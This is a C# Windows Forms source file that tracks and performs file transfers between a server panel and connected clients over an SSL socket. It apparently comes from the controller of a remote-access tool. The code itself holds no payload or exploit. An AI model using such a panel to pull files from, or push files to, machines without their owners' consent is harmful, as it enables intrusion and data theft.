using Server.Connection;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net.Sockets;
using Timer = System.Threading.Timer;
using Server.Helper;
using Server.Algorithm;

namespace Server.Forms
{
    public partial class FormDownloadFile : Form
    {
        public Form1 F { get; set; }
        internal Clients Client { get; set; }
        public long FileSize = 0;
        private long BytesSent = 0;
        public string FullFileName;
        public string ClientFullFileName;
        private bool IsUpload = false;

        public FormDownloadFile()
        {
            InitializeComponent();
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (!IsUpload)
            {
                labelsize.Text = $"{Methods.BytesToString(FileSize)} \\ {Methods.BytesToString(Client.BytesRecevied)}";
                if (Client.BytesRecevied >= FileSize)
                {
                    labelsize.Text = "Downloaded";
                    labelsize.ForeColor = Color.Green;
                    timer1.Stop();
                }
            }
            else
            {
                labelsize.Text = $"{Methods.BytesToString(FileSize)} \\ {Methods.BytesToString(BytesSent)}";
                if (BytesSent >= FileSize)
                {
                    labelsize.Text = "Uploaded";
                    labelsize.ForeColor = Color.Green;
                    timer1.Stop();
                }
            }
        }

        private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                Client?.Disconnected();
                timer1?.Dispose();
            }
            catch { }
        }

        public void Send(object obj)
        {
            lock (Client.SendSync)
            {
                try
                {
                    IsUpload = true;
                    byte[] msg = (byte[])obj;
                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
                    Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
                    Client.SslClient.Write(buffersize, 0, buffersize.Length);

                    if (msg.Length > 1000000) //1mb
                    {
                        int chunkSize = 50 * 1024;
                        byte[] chunk = new byte[chunkSize];
                        using (MemoryStream buffereReader = new MemoryStream(msg))
                        using (BinaryReader binaryReader = new BinaryReader(buffereReader))
                        {
                            int bytesToRead = (int)buffereReader.Length;
                            do
                            {
                                chunk = binaryReader.ReadBytes(chunkSize);
                                bytesToRead -= chunkSize;
                                Client.SslClient.Write(chunk, 0, chunk.Length);
                                Client.SslClient.Flush();
                                BytesSent += chunk.Length;
                            } while (bytesToRead > 0);
                            Client?.Disconnected();
                        }
                    }
                    else
                    {
                        Client.SslClient.Write(msg, 0, msg.Length);
                        Client.SslClient.Flush();
                    }
                    Program.form1.BeginInvoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
                catch
                {
                    Client?.Disconnected();
                    Program.form1.BeginInvoke((MethodInvoker)(() =>
                    {
                        labelsize.Text = "Error";
                        labelsize.ForeColor = Color.Red;
                    }));
                }
            }
        }
    }
}
